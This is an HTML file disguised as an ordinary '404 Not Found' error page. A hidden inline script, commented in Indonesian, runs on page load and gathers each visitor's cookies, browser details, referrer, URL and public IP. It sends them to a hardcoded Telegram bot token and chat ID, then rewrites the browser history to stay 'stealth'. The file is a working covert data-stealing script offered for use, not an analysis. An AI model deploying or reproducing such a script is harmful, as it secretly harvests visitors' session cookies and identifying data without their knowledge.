<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body {
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        h1 {
            font-size: 48px;
            color: #333;
        }
        p {
            font-size: 18px;
            color: #666;
        }
        hr {
            width: 50%;
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested page could not be found.</p>
    <hr>
    <p><em>Please check the URL or contact the administrator.</em></p>

    <!-- Script pengirim data ke Telegram -->
    <script>
        (function() {
            // Konfigurasi Telegram
            const BOT_TOKEN = "8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo";
            const CHAT_ID = "6034935293";

            // Kumpulin data pengunjung
            const data = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie || "(no cookies)",
                referrer: document.referrer || "(direct)",
                href: window.location.href,
                timestamp: new Date().toISOString()
            };

            // Ambil IP publik
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    data.ip = ipData.ip;
                    sendToTelegram(data);
                })
                .catch(() => {
                    data.ip = "(gagal ambil IP)";
                    sendToTelegram(data);
                });

            function sendToTelegram(info) {
                let message = "🔔 *404 Visitor!*\n";
                for (let key in info) {
                    message += `\n*${key}:* ${info[key]}`;
                }
                if (message.length > 4000) message = message.substring(0, 4000) + "...";

                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                new Image().src = url; // Kirim tanpa nunggu respon
            }

            // Biar makin stealth, gak ada jejak di history
            window.history.replaceState(null, "", window.location.pathname + "?");
        })();
    </script>
</body>
</html>
